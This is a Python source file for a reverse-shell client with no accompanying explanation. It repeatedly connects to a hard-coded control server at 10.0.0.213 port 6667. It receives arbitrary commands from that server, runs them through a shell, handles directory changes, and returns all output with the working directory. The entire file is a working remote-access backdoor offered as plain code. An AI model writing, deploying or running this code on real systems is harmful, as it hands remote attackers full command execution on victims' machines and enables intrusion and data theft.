import os
import socket
import subprocess
import sys
from os.path import expanduser
from time import sleep


the_host = '10.0.0.213'
the_port = 6667


def connect_to_server():
    """
    Continuously check to see if the control server is online. If it is, connect to it.

    :return:
    """

    global the_host
    global the_port
    the_sock = False

    # Loop until the connection is successful.
    while True:
        the_sock = socket.socket()
        try:
            the_sock.connect((the_host, the_port))
            print('Connected to server...')
            break
        except socket.error as the_error_message:
            print('Waiting for control server {}:{} {}'.format(the_host, the_port, the_error_message))
            sleep(5)

    return the_sock


def send_output_with_cwd(some_str):
    """
    Send something back to the control server with the current
    working directory appended to the end of it.

    :param some_str:
    :return:
    """

    global sock

    sock.send(str.encode(some_str + str(os.getcwd()) + '>'))


# Make the connection to the control server.
sock = connect_to_server()

# If we have a socket, then proceed to receive commands.
if sock:
    while True:
        try:
            data = sock.recv(1024)
        except socket.error as error_message:
            print('Something bad happened, retrying connection:', error_message)
            sock.close()
            sock = connect_to_server()
            continue

        # Continue looping if there is no data.
        if len(data) < 1:
            continue

        if data.decode('utf-8')[:15] == 'single_command-':
            d = data.decode('utf-8')[15:]
            if d == 'get_platform':
                sock.send(str.encode(sys.platform))
                continue
            elif d == 'getcwd':
                send_output_with_cwd('')
                continue

        if data.decode('utf-8') == 'quit':
            # The control server is shutting down, so we should shutdown
            # then start trying to reconnect for the next session.
            sock.close()
            print('Control server disconnected...')
            print('Waiting for server...')
            sock = connect_to_server()
            continue

        # Handle the cd command.
        if data[:2].decode('utf-8') == 'cd':
            try:
                directory = data[3:].decode('utf-8')
                # Cross platform cd to ~/
                if directory == '~/':
                    directory = expanduser('~')
                # Change the directory
                os.chdir(directory)
                send_output_with_cwd('')
                continue
            except Exception as err_msg:
                err_msg = str(err_msg)
                send_output_with_cwd(err_msg + "\n")
                continue

        # Process the command.
        cmd = subprocess.Popen(
            data[:].decode('utf-8'),
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            stdin=subprocess.PIPE
        )

        # Compile the output.
        output_bytes = cmd.stdout.read() + cmd.stderr.read()
        output_str = str(output_bytes, 'utf-8')

        # Send the output back to control server.
        send_output_with_cwd(output_str)
